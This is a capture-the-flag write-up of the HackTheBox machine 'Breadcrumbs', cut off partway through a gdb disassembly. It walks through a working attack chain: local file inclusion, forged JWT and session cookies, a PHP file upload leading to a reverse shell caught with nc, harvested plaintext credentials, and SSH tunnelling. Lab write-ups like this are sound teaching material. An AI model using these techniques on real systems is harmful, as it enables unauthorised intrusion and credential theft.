# Breadcrumbs - HackTheBox - Writeup
Windows, 40 Base Points, Hard

## Machine

![‏‏Breadcrumbs.JPG](images/Breadcrumbs.JPG)
 
## Breadcrumbs Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ nmap -sC -sV -oA nmap/Breadcrumbs 10.10.10.228
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-25 18:12 IDT
Nmap scan report for 10.10.10.228
Host is up (0.083s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.21' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=6/25%Time=60D5F286%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m18s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-25T15:17:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.21 seconds

```

Let's try to observe on port 80:
![port80.JPG](images/port80.JPG)

By click on the button we get the following webpage [http://10.10.10.228/php/books.php](http://10.10.10.228/php/books.php):
![books.JPG](images/books.JPG)

Let's intrecept the request using [BurpSuite](https://portswigger.net/burp), Just insert for title "t" and for author "a":
![intercept.JPG](images/intercept.JPG)

By changing the request body from ```title=t&author=a&method=0``` to ```title=t&author=a&method=1``` we got the following response:
![method1.JPG](images/method1.JPG)

As we can see from the error message - where ```method=1``` we need to add another parameter called ```book``` and according the error:
>file_get_contents(../books/): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php

We know that It's looking for file name of book that located on ```../books```.

If we send the following request ```book=book3.html&method=1``` we get the following response:
![book1.JPG](images/book1.JPG)

So It's mean we are able to read files from server ([LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)).

Let's try to send the following request body ```book=../includes/bookController.php&method=1``` to read the current webpage:
![bookcont.JPG](images/bookcont.JPG)

And we just get the following code:
```php
<? php
if($_SERVER['REQUEST_METHOD'] == "POST"){
    $out = "";
    require '../db/db.php';
    $title = "";
    $author = "";
    if($_POST['method'] == 0){
		if($_POST['title'] != ""){
		$title = "%".$_POST['title']."%";
        }
        if($_POST['author'] != ""){
            $author = "%".$_POST['author']."%";
        }
        
    
        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }

    elseif($_POST['method'] == 1){
        $out = file_get_contents('../books/'.$_POST['book']);
    }

    else{
        $out = false;
    }

    echo json_encode($out);
}
```

```gobuster``` also give us [http://10.10.10.228/portal/login.php](http://10.10.10.228/portal/login.php):
![portal.JPG](images/portal.JPG)

By login to the portal we get the following page:
![portallogged.JPG](images/portallogged.JPG)

The intersing page is [File Managment](http://10.10.10.228/portal/php/files.php).

By reading the source code of File Managment page (Using LFI) we can see the following code:
```php
<?php session_start();
$LOGGED_IN = false;
if($_SESSION['username'] !== "paul"){
    header("Location: ../index.php");
}
if(isset($_SESSION['loggedIn'])){
    $LOGGED_IN = true;
    require '../db/db.php';
}
else{
    header("Location: ../auth/login.php");
    die();
}
?>
<html lang="en">
    <head>
        <title>Binary</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="../assets/css/main.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/all.css">
    </head>

    <nav class="navbar navbar-default justify-content-end">
        <div class="navbar-header justify-content-end">
            <button type="button" class="navbar-toggle btn btn-outline-info p-3 m-3" data-toggle="collapse" data-target=".navbar-collapse"><i class="fas fa-hamburger"></i></button>
        </div>

        <div class="collapse navbar-collapse justify-content-end mr-5">
             <ul class="navbar-nav">
                <li class="nav-item"><a class="nav-link text-right" href="../index.php"><i class="fas fa-home"></i> Home</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="issues.php"><i class="fa fa-check" aria-hidden="true"></i> Issues</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="users.php"><i class="fa fa-user" aria-hidden="true"></i> User Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="#"><i class="fa fa-file" aria-hidden="true"></i> File Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="../auth/logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
             </ul>
        </div>
    </nav>
    <body class="bg-dark">
        <main class="main">
            <div class="row justify-content-center text-white text-center">
                <div class="col-md-3">
                    <h1>Task Submission</h1>
                    <p class="text-danger"><i class="fas fa-exclamation-circle"></i> Please upload only .zip files!</p>
                    <form onsubmit="return false">
                        <div class="form-group mt-5">
                            <input type="text" class="form-control" placeholder="Task completed" id="task" name="task">
                        </div>
                        <div class="form-group">
                            <input type="file" class="form-control" placeholder="Task" id="file" name="file">
                        </div>
                        <button type="submit" class="btn btn-outline-success btn-block py-3" id="upload">Upload</button>
                    </form>
                    <p id="message"></p>
                </div>
            </div>
        </div>
        </main>

        <?php include "../includes/footer.php"; ?>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
        <script type="text/javascript" src='../assets/js/files.js'></script>
    </body>


</html>
```

We are able to upload files to web server, But we can access this web page only if we are logged in as ```paul``` user:
```php
...
if($_SESSION['username'] !== "paul"){
    header("Location: ../index.php");
}
...
```

By reading the [login.php](http://10.10.10.228/portal/login.php) page we can see the following:
```php
<?php
require_once 'authController.php'; 
?>
<html lang="en">
    <head>
        <title>Binary</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
....
```

So it's mean we need to read also [authController.php](http://10.10.10.228/portal/authController.php):
```php
<?php 
require 'db/db.php';
require "cookie.php";
require "vendor/autoload.php";
use \\Firebase\\JWT\\JWT;

...
        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');
            
            setcookie("token", $jwt, time() + (86400 * 30), "/");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == ""){
                $_SESSION['role'] = "Awaiting approval";
            } 
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }
            
            header("Location: /portal");
        }

 ...
```

We can see how the Cookies generates:

1.  JWT token using ```$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';```.
2. ```PHPSESSID``` (On ```cookies.php```).

First, Let's [generate JWT token](https://dinochiesa.github.io/jwt/) for user ```paul``` using the secret key to see the [File Managment](http://10.10.10.228/portal/php/files.php) page:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

And to generate ```PHPSESSID``` cookie we need to read the page [cookie.php](http://10.10.10.228/portal/authController.php):
```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

As we can see the code of ```cookie.php``` generate random seed ```(0,strlen("paul")-1) ``` so we need to get all possilbe sessions (All possibles numbers from ```0, strlen("paul") - 1```, We can do it by running the following script (Changed at ```cookie.php``` the ```$username``` to ```paul```):
```bash
for (( i = 0; i < 50; i++ )); do
  php cookie.php >> sessions
done

sort -u sessions
```

By running this we get the following output:
```
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5
```

By trying each of them we found the following current cookies:
```
PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

Using that we can get the [File Managment](http://10.10.10.228/portal/php/files.php) page:

![filemgmt.JPG](images/filemgmt.JPG)

If we are trying to upload ```php``` file we got the following error:
![uploadphp.JPG](images/uploadphp.JPG)

By reading [fileController.php](http://10.10.10.228/portal/includes/fileController.php):
```php
<?php
$ret = "";
require "../vendor/autoload.php";
use \\Firebase\\JWT\\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}
```

So it's mean our file should located on ```../uploads``` with the name of the ```task``` POST request section as follow:
```HTTP
POST /portal/includes/fileController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------68917574038735738252067892863
Content-Length: 355
Origin: http://10.10.10.228
DNT: 1
Connection: close
Referer: http://10.10.10.228/portal/php/files.php
Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU


-----------------------------68917574038735738252067892863
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/x-php

<?php echo "hi"; ?>
-----------------------------68917574038735738252067892863
Content-Disposition: form-data; name="task"

1.php
-----------------------------68917574038735738252067892863--
```

It's mean the link of the file is: [http://10.10.10.228/portal/uploads/1.php](http://10.10.10.228/portal/uploads/1.php).

Let's try to upload the following [windows php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php)

Navigate it And we get a shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ nc -lvp 1234
listening on [any] 1234 ...
10.10.10.228: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.228] 58356
SOCKET: Shell has connected! PID: 7228
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>whoami
breadcrumbs\www-data
```

By enumerating we can found the following folder that contains:
```console
c:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of c:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

02/08/2021  06:37 AM    <DIR>          .
02/08/2021  06:37 AM    <DIR>          ..
11/28/2020  02:48 AM               170 alex.disabled
11/28/2020  02:48 AM               170 emma.disabled
11/28/2020  02:48 AM               170 jack.disabled
11/28/2020  02:48 AM               170 john.disabled
01/17/2021  04:11 PM               192 juliette.json
11/28/2020  02:48 AM               170 lucas.disabled
11/28/2020  02:48 AM               170 olivia.disabled
11/28/2020  02:48 AM               170 paul.disabled
11/28/2020  02:48 AM               170 sirine.disabled
11/28/2020  02:48 AM               170 william.disabled
              10 File(s)          1,722 bytes
               2 Dir(s)   6,525,378,560 bytes free

c:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>type juliette.json
{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```

And we found creds: ```juliette:jUli901./())!```.

Let's connect this user using ```ssh```:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ ssh juliette@10.10.10.228
The authenticity of host '10.10.10.228 (10.10.10.228)' can't be established.
ECDSA key fingerprint is SHA256:JpPYtFfyEYypgrRNtWR/Ekn1RM4ltgVxa41kmIxpkoY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.228' (ECDSA) to the list of known hosts.
juliette@10.10.10.228's password: 

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

juliette@BREADCRUMBS C:\Users\juliette>cd Desktop

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type user.txt
5bcf94e1a45ccbe8515f2f8d552e04a6
```

And we get the user flag ```5bcf94e1a45ccbe8515f2f8d552e04a6```.

### User 2

By reading the ```todo.html``` file from ```juliette@BREADCRUMBS C:\Users\juliette\Desktop``` we get the following content:

![todo.JPG](images/todo.JPG)

So we have hint about passwords on sticky notes:
```
Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager
```

We get get the sticky notes files from ```C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState```:
```console
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

01/15/2021  05:10 PM    <DIR>          .
01/15/2021  05:10 PM    <DIR>          ..
01/15/2021  05:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  04:10 AM             4,096 plum.sqlite
01/15/2021  05:10 PM            32,768 plum.sqlite-shm
01/15/2021  05:10 PM           329,632 plum.sqlite-wal
               4 File(s)        386,976 bytes
               2 Dir(s)   6,521,532,416 bytes free
```

Let's copy all of them using scp:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ scp juliette@10.10.10.228:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal plum.sqlite-wal
...
```

After the copy let's locate them on another Windows 10 maching on the same location ```C:\Users\evyatar9\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState```:
![sticky.JPG](images/sticky.JPG)

And just run the sticky notes to get the notes:

![notes.JPG](images/notes.JPG)

And we get the ```develoment``` creds: ```development: fN3)sN5Ee@g```. Let's use those creds using ```ssh```:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ ssh development@10.10.10.228
development@10.10.10.228's password: 

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>  
```

And we logged in as ```develoment``` user.

### Root

By enumerating we found the following directory:
```console
development@BREADCRUMBS C:\Development>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Development

01/15/2021  05:03 PM    <DIR>          .
01/15/2021  05:03 PM    <DIR>          ..
11/29/2020  04:11 AM            18,312 Krypter_Linux
               1 File(s)         18,312 bytes
               2 Dir(s)   6,518,198,272 bytes free
```

Let's copy this file ```Krypter_Linux``` using ```scp``` and check what it this file:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ file Krypter_Linux
Krypter_Linux: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped

```
By running this file we get:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ ./Krypter_Linux 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>

```

By decompilng this file using [Ghidra](https://ghidra-sre.org/) we can see the ```main``` function:
```c
undefined8 main(int param_1,long param_2)
{
  size_t sVar1;
  basic_ostream *this;
  ulong uVar2;
  basic_string local_58 [44];
  undefined4 local_2c;
  long local_28;
  int local_20;
  int local_1c;
  
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 00101263 to 001013cf has its CatchHandler @ 001013e5 */
  local_28 = curl_easy_init();
  puts(
      "Krypter V1.2\n\nNew project by Juliette.\nNew features added weekly!\nWhat to expect next update:\n\t- Windows version with GUI support\n\t- Get password from cloud and AUTOMATICALLY decrypt!\n***\n"
      );
  if (param_1 == 2) {
    local_1c = 0;
    local_20 = 0;
    while( true ) {
      uVar2 = SEXT48(local_20);
      sVar1 = strlen(*(char **)(param_2 + 8));
      if (sVar1 <= uVar2) break;
      local_1c = local_1c + *(char *)((long)local_20 + *(long *)(param_2 + 8));
      local_20 = local_20 + 1;
    }
    if (local_1c == 0x641) {
      if (local_28 != 0) {
        puts("Requesting decryption key from cloud...\nAccount: Administrator");
        curl_easy_setopt(local_28,0x2712,"http://passmanager.htb:1234/index.php");
        curl_easy_setopt(local_28,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(local_28,0x4e2b,WriteCallback);
        curl_easy_setopt(local_28,0x2711,local_58);
        local_2c = curl_easy_perform(local_28);
        curl_easy_cleanup(local_28);
        puts("Server response:\n\n");
        this = std::operator<<((basic_ostream *)std::cout,local_58);
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)this,
                   std::endl<char,std::char_traits<char>>);
      }
    }
    else {
      puts("Incorrect master key");
    }
  }
  else {
    puts("No key supplied.\nUSAGE:\n\nKrypter <key>");
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_58);
  return 0;
}
```

As we can see it's make HTTP request to ```http://passmanager.htb:1234/index.php``` (Which is like web server localhost), Because we don't have access to this port on web server - If we want to run it locally we need to create SSH tunnel as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ curl http://localhost:1234/index.php
Bad Request
```

By debug this file using [gdb](https://www.gnu.org/software/gdb/) we can break on the if statements and make the program to execute the curl reqeusts as follow:
```asm
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ gdb Krypter_Linux
gef➤ disassemble main
Dump of assembler code for function main:
   0x0000555555555247 <+0>:	push   rbp
   0x0000555555555248 <+1>:	mov    rbp,rsp
   0x000055555555524b <+4>:	push   rbx
   0x000055555555524c <+5>:	sub    rsp,0x58
   0x0000555555555250 <+9>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000555555555253 <+12>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000555555555257 <+16>:	lea    rax,[rbp-0x50]
   0x000055555555525b <+20>:	mov    rdi,rax
   0x000055555555525e <+23>:	call   0x555555555060 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@plt>
   0x0000555555555263 <+28>:	call   0x5555555550d0 <curl_easy_init@plt>
   0x0000555555555268 <+33>:	mov    QWORD PTR [rbp-0x20],rax
   0x000055555555526c <+37>:	lea    rdi,[rip+0xd9d]        # 0x555555556010
   0x0000555555555273 <+44>:	call   0x5555555550f0 <puts@plt>
   0x0000555555555278 <+49>:	cmp    DWORD PTR [rbp-0x54],0x2
   0x000055555555527c <+53>:	jne    0x5555555553c4 <main+381>
   0x0000555555555282 <+59>:	mov    DWORD PTR [rbp-0x14],0x0
   0x0000555555555289 <+66>:	mov    DWORD PTR [rbp-0x18],0x0
   0x0000555555555290 <+73>:	mov    eax,DWORD PTR [rbp-0x18]
   0x0000555555555293 <+76>:	movsxd rbx,eax
   0x0000555555555296 <+79>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000055555555529a <+83>:	add    rax,0x8
   0x000055555555529e <+87>:	mov    rax,QWORD PTR [rax]
   0x00005555555552a1 <+90>:	mov    rdi,rax
   0x00005555555552a4 <+93>:	call   0x555555555070 <strlen@plt>
   0x00005555555552a9 <+98>:	cmp    rbx,rax
   0x00005555555552ac <+101>:	jae    0x5555555552d0 <main+137>
   0x00005555555552ae <+103>:	mov    rax,QWORD PTR [rbp-0x60]
   0x00005555555552b2 <+107>:	add    rax,0x8
   0x00005555555552b6 <+111>:	mov    rdx,QWORD PTR [rax]
   0x00005555555552b9 <+114>:	mov    eax,DWORD PTR [rbp-0x18]
   0x00005555555552bc <+117>:	cdqe   
   0x00005555555552be <+119>:	add    rax,rdx
   0x00005555555552c1 <+122>:	movzx  eax,BYTE PTR [rax]
   0x00005555555552c4 <+125>:	movsx  eax,al
   0x00005555555552c7 <+128>:	add    DWORD PTR [rbp-0x14],eax
   0x00005555555552ca <+131>:	add    DWORD PTR [rbp-0x18],0x1
   0x00005555555552ce <+135>:	jmp    0x555555555290 <main+73>
   0x00005555555552d0 <+137>:	cmp    DWORD PTR [rbp-0x14],0x641
   0x00005555555552d7 <+144>:	jne    0x5555555553b6 <main+367>
   0x00005555555552dd <+150>:	cmp    QWORD PTR [rbp-0x20],0x0
   0x00005555555552e2 <+155>:	je     0x5555555553d0 <main+393>
   0x00005555555552e8 <+161>:	lea    rdi,[rip+0xde1]        # 0x5555555560d0
   0x00005555555552ef <+168>:	call   0x5555555550f0 <puts@plt>
   0x00005555555552f4 <+173>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00005555555552f8 <+177>:	lea    rdx,[rip+0xe11]        # 0x555555556110
   0x00005555555552ff <+184>:	mov    esi,0x2712
   0x0000555555555304 <+189>:	mov    rdi,rax
   0x0000555555555307 <+192>:	mov    eax,0x0
   0x000055555555530c <+197>:	call   0x5555555550b0 <curl_easy_setopt@plt>
   0x0000555555555311 <+202>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555555315 <+206>:	lea    rdx,[rip+0xe1c]        # 0x555555556138
   0x000055555555531c <+213>:	mov    esi,0x271f
   0x0000555555555321 <+218>:	mov    rdi,rax
   0x0000555555555324 <+221>:	mov    eax,0x0
   0x0000555555555329 <+226>:	call   0x5555555550b0 <curl_easy_setopt@plt>
   0x000055555555532e <+231>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555555332 <+235>:	lea    rdx,[rip+0xfffffffffffffecc]        # 0x555555555205 <_ZL13WriteCallbackPvmmS_>
   0x0000555555555339 <+242>:	mov    esi,0x4e2b
   0x000055555555533e <+247>:	mov    rdi,rax
   0x0000555555555341 <+250>:	mov    eax,0x0
   0x0000555555555346 <+255>:	call   0x5555555550b0 <curl_easy_setopt@plt>
   0x000055555555534b <+260>:	lea    rdx,[rbp-0x50]
   0x000055555555534f <+264>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555555353 <+268>:	mov    esi,0x2711
   0x0000555555555358 <+273>:	mov    rdi,rax
   0x000055555555535b <+276>:	mov    eax,0x0
   0x0000555555555360 <+281>:	call   0x5555555550b0 <curl_easy_setopt@plt>
   0x0000555555555365 <+286>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555555369 <+290>:	mov    rdi,rax
   0x000055555555536c <+293>:	call   0x555555555090 <curl_easy_perform@plt>
   0x0000555555555371 <+298>:	mov    DWORD PTR [rbp-0x24],eax
   0x0000555555555374 <+301>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555555378 <+305>:	mov    rdi,rax
   0x000055555555537b <+308>:	call   0x555555555030 <curl_easy_cleanup@plt>
   0x0000555555555380 <+313>:	lea    rdi,[rip+0xde6]        # 0x55555555616d
   0x0000555555555387 <+320>:	call   0x5555555550f0 <puts@plt>
   0x000055555555538c <+325>:	lea    rax,[rbp-0x50]
   0x0000555555555390 <+329>:	mov    rsi,rax
   0x0000555555555393 <+332>:	lea    rdi,[rip+0x2d26]        # 0x5555555580c0 <_ZSt4cout@@GLIBCXX_3.4>
   0x000055555555539a <+339>:	call   0x555555555040 <_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKNSt7__cxx1112basic_stringIS4_S5_T1_EE@plt>
   0x000055555555539f <+344>:	mov    rdx,rax
   0x00005555555553a2 <+347>:	mov    rax,QWORD PTR [rip+0x2c47]        # 0x555555557ff0
   0x00005555555553a9 <+354>:	mov    rsi,rax
   0x00005555555553ac <+357>:	mov    rdi,rdx
   0x00005555555553af <+360>:	call   0x555555555100 <_ZNSolsEPFRSoS_E@plt>
   0x00005555555553b4 <+365>:	jmp    0x5555555553d0 <main+393>
   0x00005555555553b6 <+367>:	lea    rdi,[rip+0xdc3]        # 0x555555556180
   0x00005555555553bd <+374>:	call   0x5555555550f0 <puts@plt>
   0x00005555555553c2 <+379>:	jmp    0x5555555553d0 <main+393>
   0x00005555555553c4 <+381>:	lea    rdi,[rip+0xdcd]        # 0x555555556198
   0x00005555555553cb <+388>:	call   0x5555555550f0 <puts@plt>
   0x00005555555553d0 <+393>:	mov    ebx,0x0
   0x00005555555553d5 <+398>:	lea    rax,[rbp-0x50]
   0x00005555555553d9 <+402>:	mov    rdi,rax
   0x00005555555553dc <+405>:	call   0x5555555550a0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt>
   0x00005555555553e1 <+410>:	mov    eax,ebx
   0x00005555555553e3 <+412>:	jmp    0x5555555553ff <main+440>
   0x00005555555553e5 <+414>:	mov    rbx,rax
   0x00005555555553e8 <+417>:	lea    rax,[rbp-0x50]
   0x00005555555553ec <+421>:	mov    rdi,rax
   0x00005555555553ef <+424>:	call   0x5555555550a0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt>
   0x00005555555553f4 <+429>:	mov    rax,rbx
   0x00005555555553f7 <+432>:	mov    rdi,rax
   0x00005555555553fa <+435>:	call   0x555555555080 <_Unwind_Resume@plt>
   0x00005555555553ff <+440>:	add    rsp,0x58
   0x0000555555555403 <+444>:	pop    rbx
